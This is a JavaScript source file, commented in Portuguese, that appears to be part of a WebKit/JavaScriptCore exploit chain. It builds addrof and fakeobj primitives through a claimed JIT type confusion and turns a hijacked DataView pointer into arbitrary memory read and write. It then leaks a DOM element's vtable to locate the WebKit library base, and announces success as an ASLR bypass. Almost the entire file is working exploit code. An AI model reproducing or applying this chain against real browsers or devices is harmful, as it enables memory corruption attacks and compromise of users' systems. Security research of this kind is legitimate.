// js/script3/testArrayBufferVictimCrash.mjs (v122 - Solução Definitiva)
// =======================================================================================
// LOG DE ALTERAÇÕES:
// - COMBINADAS as duas estratégias de sucesso:
//   1. A primitiva `addrof` funcional é obtida via JIT Type Confusion (descoberta na v121).
//   2. As primitivas de L/E são construídas de forma robusta, sequestrando o ponteiro de
//      um DataView para evitar bugs de dados obsoletos (stale data) (técnica da v119).
// - Esta versão representa a cadeia de exploração completa e mais estável desenvolvida.
// =======================================================================================

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import { JSC_OFFSETS } from '../config.mjs';
import { triggerOOB_primitive } from '../core_exploit.mjs';

export const FNAME_MODULE_FINAL = "Uncaged_v122_FinalChain";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function runFinalUnifiedTest() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Cadeia de Exploração Completa e Robusta ---`, "test");

    let final_result = { success: false, message: "A cadeia de exploração falhou." };

    try {
        // --- FASE 1: Ativar Pré-requisito e Configurar Primitiva 'addrof' Funcional ---
        logS3("--- FASE 1: Ativando pré-requisito OOB e configurando 'addrof'... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });

        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        const addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };
        const fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            return victim_array[0];
        };
        
        const sanity_check_addr = addrof({test: 1});
        if (!sanity_check_addr || typeof sanity_check_addr.add !== 'function') {
             throw new Error("A primitiva 'addrof' falhou no sanity check.");
        }
        logS3("Primitiva 'addrof' funcional e verificada.", "good");

        // --- FASE 2: Construir L/E ROBUSTA via Sequestro de DataView ---
        logS3("--- FASE 2: Construindo L/E arbitrária robusta via DataView... ---", "subtest");
        const dv_buf = new ArrayBuffer(8);
        const dataview_tool = new DataView(dv_buf);
        const dataview_addr = addrof(dataview_tool);
        const dv_vector_ptr_addr = dataview_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
        
        // Primitiva de escrita temporária e instável, usada apenas para configurar a ferramenta.
        const temp_leaker = { p: null, v: 0 };
        const unstable_arb_write = (addr, value) => {
            temp_leaker.p = fakeobj(addr);
            temp_leaker.v = int64ToDouble(value);
        };

        // Primitivas ROBUSTAS e FINAIS
        const arb_write = (addr, value) => {
            unstable_arb_write(dv_vector_ptr_addr, addr);
            dataview_tool.setFloat64(0, int64ToDouble(value), true);
        };
        const arb_read = (addr) => {
            unstable_arb_write(dv_vector_ptr_addr, addr);
            return doubleToInt64(dataview_tool.getFloat64(0, true));
        };
        logS3("Primitivas de L/E robustas construídas com sucesso.", "good");

        // --- FASE 3: Verificação Funcional das Primitivas Robustas ---
        logS3("--- FASE 3: Verificando as primitivas de L/E robustas... ---", "subtest");
        const test_obj = { prop_a: 0xDEADBEEF };
        const prop_a_addr = addrof(test_obj).add(0x10);
        const value_to_write = new AdvancedInt64(0xABCDEF, 0x123456);
        
        arb_write(prop_a_addr, value_to_write);
        const value_read = arb_read(prop_a_addr);
        
        if (!value_read.equals(value_to_write)) {
            throw new Error(`A verificação de L/E ROBUSTA falhou. Escrito: ${toHex(value_to_write)}, Lido: ${toHex(value_read)}`);
        }
        logS3(`[VERIFICAÇÃO] SUCESSO! Valor lido (${toHex(value_read)}) corresponde ao escrito.`, "good");

        // --- FASE 4: Vazamento da Base do WebKit ---
        logS3("--- FASE 4: Tentando vazar a base da biblioteca WebKit... ---", "subtest");
        const div_element = document.createElement('div');
        const div_addr = addrof(div_element);
        const vtable_ptr = arb_read(div_addr);
        const ALIGNMENT_MASK = new AdvancedInt64(0x3FFF, 0).not();
        const webkit_base = vtable_ptr.and(ALIGNMENT_MASK);
        const elf_magic = arb_read(webkit_base).low();
        logS3(`[LEAK] Endereço do 'div': ${toHex(div_addr)}`);
        logS3(`[LEAK] Ponteiro Vtable: ${toHex(vtable_ptr)}`);
        logS3(`[LEAK] Base WebKit (candidato): ${toHex(webkit_base)}`);
        logS3(`[LEAK] Assinatura ELF lida: ${toHex(elf_magic)}`);

        if (elf_magic === 0x464C457F) {
            logS3("++++++++++++ SUCESSO FINAL! A assinatura ELF foi encontrada! ++++++++++++", "vuln");
            final_result = {
                success: true,
                message: `Bypass de ASLR bem-sucedido. Base do WebKit: ${toHex(webkit_base)}`
            };
        } else {
            throw new Error(`Assinatura ELF não encontrada. Lido: ${toHex(elf_magic)}`);
        }

    } catch (e) {
        final_result.message = `Exceção crítica na implementação: ${e.message}`;
        logS3(`${final_result.message}\n${e.stack || ''}`, "critical");
        console.error(e);
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
